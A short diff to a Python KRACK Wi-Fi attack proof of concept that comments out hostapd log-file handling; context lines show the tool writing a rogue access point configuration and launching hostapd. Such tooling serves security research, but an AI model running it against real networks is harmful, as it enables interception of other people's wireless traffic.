@@ -931,7 +931,7 @@ class KRAckAttack():
 		with open("/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 		self.hostapd = subprocess.Popen(["hostapd", "/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		self.hostapd_log = open("hostapd_rogue.log", "w")
+		# self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(5)
@@ -989,8 +989,8 @@ class KRAckAttack():
 		if self.hostapd:
 			self.hostapd.terminate()
 			self.hostapd.wait()
-		if self.hostapd_log:
-			self.hostapd_log.close()
+		# if self.hostapd_log:
+		# 	self.hostapd_log.close()
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
 
